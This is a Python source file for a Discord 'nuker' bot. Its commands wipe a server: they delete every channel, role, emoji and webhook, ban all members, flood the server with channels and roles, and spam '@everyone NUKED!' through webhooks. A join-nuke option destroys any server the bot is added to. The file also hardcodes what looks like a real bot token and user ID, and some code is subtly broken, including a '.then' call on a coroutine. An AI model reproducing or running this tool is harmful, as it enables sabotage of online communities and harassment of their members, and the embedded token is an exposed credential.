#!/usr/bin/python3
# -*- coding: utf-8 -*-

import discord
from discord.ext import commands
import asyncio
import sys
import requests
from colorama import init, Fore
from random import randint, choice, choices
from math import ceil
from io import BytesIO

init(autoreset=True)

# Configuration
TOKEN = "MTM1ODE0NDE2Mzk3NTI3MDU2OA.Gm0C73.edKXwgn7xL8S-hxNFCmZ-X10cziXoz2l1GmjMw"  # Replace with your bot token
USER_ID = "1053079666459693077"  # Replace with your Discord user ID (as a string)
COMMAND_PREFIX = "."

# Bot setup
intents = discord.Intents.all()
client = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
client.remove_command('help')

# Global variables
selected_server = None
per_page = 15
headers = {'Authorization': f'Bot {TOKEN}', 'Content-Type': 'application/json'}
auto_nick = False
auto_status = False
nuke_on_join = False
saved_ctx = None

def banner():
    sys.stdout.buffer.write(f'''\
 ██████╗                  ██████╗ ███████╗ █████╗ ██╗     
██╔════╝                  ██╔══██╗██╔════╝██╔══██╗██║   
██║         █████╗        ██████╔╝█████╗  ███████║██║     
██║         ╚════╝        ██╔══██╗██╔══╝  ██╔══██║██║   
╚██████╗                  ██║  ██║███████╗██║  ██║███████╗
 ╚═════╝                  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
'''.encode('utf8'))

# Utility functions
async def log(ctx, message):
    try:
        await ctx.send(message)
    except:
        print(f"{Fore.YELLOW}[LOG] {message}")

async def embed(ctx, n, title, array):
    if not n.isdigit() or (n := int(n) - 1) < 0:
        await log(ctx, 'Bad page number.')
        return
    names = ''
    ids = ''
    item_length = len(array)
    if item_length == 0:
        return await ctx.send(f'{title} count: 0')
    init_item = n * per_page
    final_item = min(init_item + per_page, item_length)
    for i in range(init_item, final_item):
        item = array[i]
        name = str(item.name)[:17] + '...' if len(str(item.name)) > 17 else str(item.name)
        names += f'{name}\n'
        ids += f'{str(item.id)}\n'
    embed = discord.Embed(title=title, description=f'Total count: {item_length}', color=randint(0, 0xFFFFFF))
    embed.add_field(name='Name', value=names, inline=True)
    embed.add_field(name='ID', value=ids, inline=True)
    embed.set_footer(text=f'{n+1}/{ceil(item_length / per_page)}')
    await ctx.send(embed=embed)

async def has_target(ctx):
    global selected_server
    if selected_server:
        return True
    if ctx.guild:
        selected_server = ctx.guild
        await log(ctx, f'Automatically connected to {selected_server.name}')
        return True
    await log(ctx, f'No server selected. Use {COMMAND_PREFIX}connect')
    return False

def containing(array, name):
    for item in array:
        if str(item.name).lower() == name.lower() or str(item.id) == name:
            return item
    return None

def name_id_handler(name):
    if name.startswith(('<@!', '<@&', '<@')):
        return name.strip('<@!&>').strip('>')
    return name

# Permission check
def check_perm(ctx):
    return str(ctx.author.id) == USER_ID

# Events
@client.event
async def on_ready():
    banner()
    print(f'{Fore.GREEN}Bot ready.')
    print(f'{Fore.MAGENTA}Logged in as {client.user.name}#{client.user.discriminator}')
    print(f'{Fore.MAGENTA}ID: {client.user.id}')
    print(f'{Fore.MAGENTA}Command prefix: {COMMAND_PREFIX}')

@client.event
async def on_guild_join(guild):
    global nuke_on_join, saved_ctx
    if nuke_on_join and saved_ctx:
        global selected_server
        selected_server = guild
        await nuke(saved_ctx)

# Commands
@client.command(name='help')
@commands.check(check_perm)
async def help(ctx):
    commands_list = sorted([cmd.name for cmd in client.commands])
    await ctx.send(f"Commands: {', '.join(commands_list)}\nUse {COMMAND_PREFIX}help <command> for more info")

@client.command(name='servers')
@commands.check(check_perm)
async def servers(ctx, n='1'):
    await embed(ctx, n, 'Servers', client.guilds)

@client.command(name='channels')
@commands.check(check_perm)
async def channels(ctx, n='1'):
    if not await has_target(ctx):
        return
    await embed(ctx, n, 'Channels', selected_server.text_channels)

@client.command(name='roles')
@commands.check(check_perm)
async def roles(ctx, n='1'):
    if not await has_target(ctx):
        return
    await embed(ctx, n, 'Roles', selected_server.roles)

@client.command(name='members')
@commands.check(check_perm)
async def members(ctx, n='1'):
    if not await has_target(ctx):
        return
    await embed(ctx, n, 'Members', selected_server.members)

@client.command(name='voiceChannels')
@commands.check(check_perm)
async def voice_channels(ctx, n='1'):
    if not await has_target(ctx):
        return
    await embed(ctx, n, 'Voice Channels', selected_server.voice_channels)

@client.command(name='categories')
@commands.check(check_perm)
async def categories(ctx, n='1'):
    if not await has_target(ctx):
        return
    await embed(ctx, n, 'Categories', selected_server.categories)

@client.command(name='emojis')
@commands.check(check_perm)
async def emojis(ctx, n='1'):
    if not await has_target(ctx):
        return
    await embed(ctx, n, 'Emojis', selected_server.emojis)

@client.command(name='bans')
@commands.check(check_perm)
async def bans(ctx, n='1'):
    if not await has_target(ctx):
        return
    ban_list = [entry.user for entry in await selected_server.bans()]
    await embed(ctx, n, 'Bans', ban_list)

@client.command(name='connect')
@commands.check(check_perm)
async def connect(ctx, *, server_id=None):
    global selected_server
    if server_id:
        selected_server = client.get_guild(int(server_id))
    elif ctx.guild:
        selected_server = ctx.guild
    else:
        await log(ctx, 'Please provide a server ID or use in a server')
        return
    if selected_server:
        await log(ctx, f'Connected to {selected_server.name}')
    else:
        await log(ctx, 'Server not found')

@client.command(name='addRole')
@commands.check(check_perm)
async def add_role(ctx, *, name):
    if not await has_target(ctx):
        return
    try:
        await selected_server.create_role(name=name)
        await log(ctx, f'Added role {name}')
    except:
        await log(ctx, f'Failed to add role {name}')

@client.command(name='addChannel')
@commands.check(check_perm)
async def add_channel(ctx, name):
    if not await has_target(ctx):
        return
    try:
        await selected_server.create_text_channel(name)
        await log(ctx, f'Created channel {name}')
    except:
        await log(ctx, f'Failed to create channel {name}')

@client.command(name='addVoiceChannel')
@commands.check(check_perm)
async def add_voice_channel(ctx, name):
    if not await has_target(ctx):
        return
    try:
        await selected_server.create_voice_channel(name)
        await log(ctx, f'Created voice channel {name}')
    except:
        await log(ctx, f'Failed to create voice channel {name}')

@client.command(name='addEmoji')
@commands.check(check_perm)
async def add_emoji(ctx, url, name=None):
    if not await has_target(ctx):
        return
    if not name:
        name = f'emoji_{randint(1, 999)}'
    try:
        if url.startswith(('http://', 'https://')):
            image = BytesIO(requests.get(url).content).read()
            await selected_server.create_custom_emoji(name=name, image=image)
            await log(ctx, f'Added emoji {name}')
    except:
        await log(ctx, f'Failed to add emoji from {url}')

@client.command(name='addCategory')
@commands.check(check_perm)
async def add_category(ctx, *, name):
    if not await has_target(ctx):
        return
    try:
        await selected_server.create_category(name)
        await log(ctx, f'Created category {name}')
    except:
        await log(ctx, f'Failed to create category {name}')

@client.command(name='deleteRole')
@commands.check(check_perm)
async def delete_role(ctx, *, name):
    if not await has_target(ctx):
        return
    role = containing(selected_server.roles, name)
    if role:
        try:
            await role.delete()
            await log(ctx, f'Deleted role {role.name}')
        except:
            await log(ctx, f'Failed to delete role {role.name}')
    else:
        await log(ctx, f'Role {name} not found')

@client.command(name='deleteChannel')
@commands.check(check_perm)
async def delete_channel(ctx, name):
    if not await has_target(ctx):
        return
    channel = containing(selected_server.text_channels, name)
    if channel:
        try:
            await channel.delete()
            await log(ctx, f'Deleted channel {channel.name}')
        except:
            await log(ctx, f'Failed to delete channel {channel.name}')
    else:
        await log(ctx, f'Channel {name} not found')

@client.command(name='deleteVoiceChannel')
@commands.check(check_perm)
async def delete_voice_channel(ctx, name):
    if not await has_target(ctx):
        return
    channel = containing(selected_server.voice_channels, name)
    if channel:
        try:
            await channel.delete()
            await log(ctx, f'Deleted voice channel {channel.name}')
        except:
            await log(ctx, f'Failed to delete voice channel {channel.name}')
    else:
        await log(ctx, f'Voice channel {name} not found')

@client.command(name='deleteCategory')
@commands.check(check_perm)
async def delete_category(ctx, *, name):
    if not await has_target(ctx):
        return
    category = containing(selected_server.categories, name)
    if category:
        try:
            await category.delete()
            await log(ctx, f'Deleted category {category.name}')
        except:
            await log(ctx, f'Failed to delete category {category.name}')
    else:
        await log(ctx, f'Category {name} not found')

@client.command(name='deleteCC')
@commands.check(check_perm)
async def delete_cc(ctx, *, name):
    if not await has_target(ctx):
        return
    channel = containing(selected_server.channels, name)
    if channel:
        try:
            await channel.delete()
            await log(ctx, f'Deleted channel {channel.name}')
        except:
            await log(ctx, f'Failed to delete channel {channel.name}')
    else:
        await log(ctx, f'Channel {name} not found')

@client.command(name='deleteEmoji')
@commands.check(check_perm)
async def delete_emoji(ctx, *, name):
    if not await has_target(ctx):
        return
    emoji = containing(selected_server.emojis, name)
    if emoji:
        try:
            await emoji.delete()
            await log(ctx, f'Deleted emoji {emoji.name}')
        except:
            await log(ctx, f'Failed to delete emoji {emoji.name}')
    else:
        await log(ctx, f'Emoji {name} not found')

@client.command(name='deleteAllRoles')
@commands.check(check_perm)
async def delete_all_roles(ctx):
    if not await has_target(ctx):
        return
    tasks = [role.delete() for role in selected_server.roles]
    await asyncio.gather(*tasks, return_exceptions=True)
    await log(ctx, 'Deleted all roles')

@client.command(name='deleteAllChannels')
@commands.check(check_perm)
async def delete_all_channels(ctx):
    if not await has_target(ctx):
        return
    tasks = [channel.delete() for channel in selected_server.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    await log(ctx, 'Deleted all channels')

@client.command(name='deleteAllEmojis')
@commands.check(check_perm)
async def delete_all_emojis(ctx):
    if not await has_target(ctx):
        return
    tasks = [emoji.delete() for emoji in selected_server.emojis]
    await asyncio.gather(*tasks, return_exceptions=True)
    await log(ctx, 'Deleted all emojis')

@client.command(name='deleteAllWebhooks')
@commands.check(check_perm)
async def delete_all_webhooks(ctx):
    if not await has_target(ctx):
        return
    webhooks = await selected_server.webhooks()
    tasks = [webhook.delete() for webhook in webhooks]
    await asyncio.gather(*tasks, return_exceptions=True)
    await log(ctx, 'Deleted all webhooks')

@client.command(name='banAll')
@commands.check(check_perm)
async def ban_all(ctx):
    if not await has_target(ctx):
        return
    tasks = [member.ban() for member in selected_server.members if str(member.id) != USER_ID]
    await asyncio.gather(*tasks, return_exceptions=True)
    await log(ctx, 'Banned all members')

@client.command(name='ban')
@commands.check(check_perm)
async def ban(ctx, member_id):
    if not await has_target(ctx):
        return
    member = selected_server.get_member(int(name_id_handler(member_id)))
    if member:
        try:
            await member.ban()
            await log(ctx, f'Banned {member.name}#{member.discriminator}')
        except:
            await log(ctx, f'Failed to ban {member.name}#{member.discriminator}')
    else:
        await log(ctx, f'Member {member_id} not found')

@client.command(name='unban')
@commands.check(check_perm)
async def unban(ctx, *, name):
    if not await has_target(ctx):
        return
    bans = [entry.user for entry in await selected_server.bans()]
    member = containing(bans, name_id_handler(name))
    if member:
        try:
            await selected_server.unban(member)
            await log(ctx, f'Unbanned {member.name}#{member.discriminator}')
        except:
            await log(ctx, f'Failed to unban {member.name}#{member.discriminator}')
    else:
        await log(ctx, f'User {name} not found in bans')

@client.command(name='channelBomb')
@commands.check(check_perm)
async def channel_bomb(ctx, n):
    if not await has_target(ctx):
        return
    if not n.isdigit() or int(n) < 1:
        await log(ctx, 'Please enter a positive number')
        return
    n = int(n)
    tasks = [selected_server.create_text_channel(f'bomb-{i}') for i in range(n)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await log(ctx, f'Created {n} channels')

@client.command(name='categoryBomb')
@commands.check(check_perm)
async def category_bomb(ctx, n):
    if not await has_target(ctx):
        return
    if not n.isdigit() or int(n) < 1:
        await log(ctx, 'Please enter a positive number')
        return
    n = int(n)
    tasks = [selected_server.create_category(f'bomb-{i}') for i in range(n)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await log(ctx, f'Created {n} categories')

@client.command(name='roleBomb')
@commands.check(check_perm)
async def role_bomb(ctx, n):
    if not await has_target(ctx):
        return
    if not n.isdigit() or int(n) < 1:
        await log(ctx, 'Please enter a positive number')
        return
    n = int(n)
    tasks = [selected_server.create_role(name=f'role-{i}') for i in range(n)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await log(ctx, f'Created {n} roles')

@client.command(name='kaboom')
@commands.check(check_perm)
async def kaboom(ctx, n):
    if not await has_target(ctx):
        return
    if not n.isdigit() or int(n) < 1:
        await log(ctx, 'Please enter a positive number')
        return
    n = int(n)
    await log(ctx, f'Dropping {n} bombs...')
    tasks = [
        channel_bomb(ctx, n),
        category_bomb(ctx, n),
        role_bomb(ctx, n)
    ]
    await asyncio.gather(*tasks)
    await log(ctx, 'Kaboom complete!')

@client.command(name='nuke')
@commands.check(check_perm)
async def nuke(ctx):
    if not await has_target(ctx):
        return
    await log(ctx, f'Nuking {selected_server.name}...')
    tasks = [
        delete_all_channels(ctx),
        delete_all_roles(ctx),
        ban_all(ctx),
        delete_all_webhooks(ctx),
        delete_all_emojis(ctx)
    ]
    await asyncio.gather(*tasks)
    await log(ctx, 'Nuke complete!')

@client.command(name='webhook')
@commands.check(check_perm)
async def webhook(ctx, n='10'):
    if not await has_target(ctx):
        return
    if not n.isdigit() or int(n) < 1:
        await log(ctx, 'Please enter a positive number')
        return
    n = int(n)
    tasks = []
    for channel in selected_server.text_channels[:n]:
        tasks.append(channel.create_webhook(name='nuke-webhook').then(lambda w: w.send('@everyone NUKED!')))
    await asyncio.gather(*tasks, return_exceptions=True)
    await log(ctx, f'Created and spammed {n} webhooks')

@client.command(name='config')
@commands.check(check_perm)
async def config(ctx):
    await log(ctx, 'Config command placeholder - no settings to configure with hardcoded token/ID')

@client.command(name='checkRolePermissions')
@commands.check(check_perm)
async def check_role_permissions(ctx, member_id, n='1'):
    if not await has_target(ctx):
        return
    member = selected_server.get_member(int(name_id_handler(member_id)))
    if not member:
        await log(ctx, f'Member {member_id} not found')
        return
    perms = member.guild_permissions
    perm_list = [f'{"✅" if value else "❌"} {name.replace("_", " ").capitalize()}' for name, value in perms]
    if not n.isdigit() or (n := int(n) - 1) < 0:
        await log(ctx, 'Bad page number')
        return
    init_item = n * per_page
    final_item = min(init_item + per_page, len(perm_list))
    embed = discord.Embed(title=f'Permissions for {member.name}', color=randint(0, 0xFFFFFF))
    embed.add_field(name='Permissions', value='\n'.join(perm_list[init_item:final_item]), inline=False)
    embed.set_footer(text=f'{n+1}/{ceil(len(perm_list) / per_page)}')
    await ctx.send(embed=embed)

@client.command(name='changeStatus')
@commands.check(check_perm)
async def change_status(ctx, status):
    status_map = {'online': discord.Status.online, 'offline': discord.Status.offline, 
                  'idle': discord.Status.idle, 'dnd': discord.Status.do_not_disturb}
    if status.lower() in status_map:
        await client.change_presence(status=status_map[status.lower()])
        await log(ctx, f'Status changed to {status}')
    else:
        await log(ctx, 'Valid statuses: online, offline, idle, dnd')

@client.command(name='disableCommunityMode')
@commands.check(check_perm)
async def disable_community_mode(ctx):
    if not await has_target(ctx):
        return
    try:
        requests.patch(f'https://discord.com/api/v8/guilds/{selected_server.id}', headers=headers,
                       json={'description': None, 'features': {'0': 'NEWS'}, 'preferred_locale': 'en-US',
                             'public_updates_channel_id': None, 'rules_channel_id': None})
        await log(ctx, 'Disabled community mode')
    except:
        await log(ctx, 'Failed to disable community mode')

@client.command(name='grantAllPerm')
@commands.check(check_perm)
async def grant_all_perm(ctx):
    await log(ctx, 'This bot is hardcoded to only allow your user ID')

@client.command(name='joinNuke')
@commands.check(check_perm)
async def join_nuke(ctx, toggle):
    global nuke_on_join, saved_ctx
    if toggle.lower() == 'true':
        nuke_on_join = True
        saved_ctx = ctx
        await log(ctx, 'Nuke on join enabled')
    elif toggle.lower() == 'false':
        nuke_on_join = False
        await log(ctx, 'Nuke on join disabled')
    else:
        await log(ctx, 'Use true or false')

@client.command(name='leave')
@commands.check(check_perm)
async def leave(ctx, server_id=None):
    if server_id:
        server = client.get_guild(int(server_id))
    elif await has_target(ctx):
        server = selected_server
    else:
        return
    if server:
        await server.leave()
        await log(ctx, f'Left {server.name}')

@client.command(name='leaveAll')
@commands.check(check_perm)
async def leave_all(ctx):
    tasks = [guild.leave() for guild in client.guilds]
    await asyncio.gather(*tasks)
    await log(ctx, 'Left all servers')

@client.command(name='link')
@commands.check(check_perm)
async def link(ctx):
    await ctx.send(f'https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot')

@client.command(name='moveRole')
@commands.check(check_perm)
async def move_role(ctx, *, name_pos):
    if not await has_target(ctx):
        return
    name, pos = name_pos.rsplit(' ', 1)
    if not pos.isdigit():
        await log(ctx, 'Position must be a number')
        return
    role = containing(selected_server.roles, name)
    if role:
        try:
            await role.edit(position=int(pos))
            await log(ctx, f'Moved {role.name} to position {pos}')
        except:
            await log(ctx, f'Failed to move {role.name}')
    else:
        await log(ctx, f'Role {name} not found')

@client.command(name='off')
@commands.check(check_perm)
async def off(ctx):
    await log(ctx, 'Shutting down...')
    await client.change_presence(status=discord.Status.offline)
    await client.close()

@client.command(name='purge')
@commands.check(check_perm)
async def purge(ctx, n=None):
    if not n or not n.isdigit() or int(n) < 1:
        await log(ctx, 'Please enter a positive number')
        return
    messages = await ctx.channel.history(limit=int(n)).flatten()
    await ctx.channel.delete_messages(messages)
    await log(ctx, f'Purged {n} messages')

@client.command(name='roleTo')
@commands.check(check_perm)
async def role_to(ctx, member_id, *, role_name):
    if not await has_target(ctx):
        return
    member = selected_server.get_member(int(name_id_handler(member_id)))
    role = containing(selected_server.roles, name_id_handler(role_name))
    if not member or not role:
        await log(ctx, 'Member or role not found')
        return
    if role in member.roles:
        await member.remove_roles(role)
        await log(ctx, f'Removed {role.name} from {member.name}')
    else:
        await member.add_roles(role)
        await log(ctx, f'Added {role.name} to {member.name}')

@client.command(name='serverIcon')
@commands.check(check_perm)
async def server_icon(ctx, url=None):
    if not await has_target(ctx):
        return
    if not url:
        await selected_server.edit(icon=None)
        await log(ctx, 'Removed server icon')
    elif url.startswith(('http://', 'https://')):
        try:
            image = BytesIO(requests.get(url).content).read()
            await selected_server.edit(icon=image)
            await log(ctx, 'Changed server icon')
        except:
            await log(ctx, f'Failed to change icon to {url}')

@client.command(name='serverName')
@commands.check(check_perm)
async def server_name(ctx, *, name):
    if not await has_target(ctx):
        return
    try:
        await selected_server.edit(name=name)
        await log(ctx, f'Changed server name to {name}')
    except:
        await log(ctx, 'Failed to change server name')

@client.command(name='autoNick')
@commands.check(check_perm)
async def auto_nick_cmd(ctx):
    global auto_nick
    if not await has_target(ctx):
        return
    auto_nick = not auto_nick
    await log(ctx, f'Auto nick {"enabled" if auto_nick else "disabled"}')
    while auto_nick and selected_server:
        await selected_server.me.edit(nick=''.join(choices('abcdefghijklmnopqrstuvwxyz', k=10)))
        await asyncio.sleep(1)

@client.command(name='autoStatus')
@commands.check(check_perm)
async def auto_status_cmd(ctx):
    global auto_status
    auto_status = not auto_status
    await log(ctx, f'Auto status {"enabled" if auto_status else "disabled"}')
    statuses = [discord.Status.online, discord.Status.offline, discord.Status.idle, discord.Status.do_not_disturb]
    while auto_status:
        await client.change_presence(status=choice(statuses))
        await asyncio.sleep(1)

# Error handling
@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("You don't have permission to use this command.")
    else:
        await ctx.send(f"Error: {str(error)}")

# Run bot
try:
    client.run(TOKEN)
except Exception as e:
    print(f"Error: {e}")
finally:
    print("Bot stopped")
